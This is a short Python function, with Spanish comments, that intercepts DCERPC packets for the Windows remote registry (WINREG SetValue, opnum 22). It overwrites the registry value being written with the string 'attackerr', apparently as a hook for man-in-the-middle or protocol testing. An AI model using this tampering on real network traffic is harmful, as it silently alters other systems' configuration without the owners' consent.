def winreg_set_value(packet):
    """
    Modifica un paquete DCERPC relacionado con WINREG para cambiar el valor de registro.
    """
    try:
        # Verificar si el paquete contiene la operación y es el tipo esperado
        if packet['DCERPC']['opnum'] == 22:
            packet['WINREG']['winreg_value'] = b'a\x00t\x00t\x00a\x00c\x00k\x00e\x00r\x00r\x00'
            print("¡Paquete Set Value modificado!")
        return packet
    except KeyError as e:
        # Capturar excepciones específicas si las claves no existen en el paquete
        print(f"Clave no encontrada en el paquete: {e}")
        return packet
    except Exception as e:
        # Manejar cualquier otra excepción
        print(f"Error al modificar el paquete: {e}")
        return packet
